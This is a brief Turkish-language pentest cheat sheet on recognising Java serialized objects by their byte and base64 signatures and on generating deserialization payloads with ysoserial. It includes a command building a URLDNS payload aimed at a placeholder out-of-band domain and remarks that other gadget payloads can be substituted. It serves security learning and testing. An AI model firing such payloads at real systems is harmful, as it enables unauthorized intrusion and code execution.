# Java mı? — Tanıma (en kritik beceri)


| Encoding | Nasıl görünür | Ne demek |
|---|---|---|
| Raw bytes | `AC ED 00 05` ile başlar (Hex view'da) | Java serialized object |
| Base64 | `rO0AB` ile başlar | `AC ED 00 05`'in base64'ü |
| Gzip+Base64 | `H4sIA` ile başlar | Sıkıştırılmış, decode et |
| Base64 (URL-safe) | `rO0AB` ama `+/` yerine `-_` | Aynı şey |

> **Ezber:** `rO0AB` gördüğün an → %100 Java. Bu senin "PHP'deki `O:8:`" karşılığın.
 
 
## Javada payloadları listeleme

```bash
java -jar /root/ysoserial-all.jar --help
```

## Javada payload yazma

**burada urldns yerine başka payload kullanılabilir**

```bash
java -jar /root/ysoserial-all.jar URLDNS "http://SENIN-OOB-DOMAIN" \
  2>/dev/null | base64 -w0
```
 

